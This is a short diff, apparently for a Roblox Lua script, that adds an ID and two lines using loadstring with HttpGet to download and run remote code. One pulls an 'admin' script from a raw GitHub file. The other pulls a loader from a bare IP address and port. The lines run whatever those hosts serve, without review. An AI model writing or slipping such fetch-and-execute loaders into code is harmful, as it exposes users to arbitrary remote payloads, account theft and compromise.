@@ -1,0 +1,3 @@
+ID="b944ddd3-278a-49c7-9021-0bdda2454473";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/r4mpageADM/refs/heads/main/r4mpageadmREAL.lua"));
+loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))();
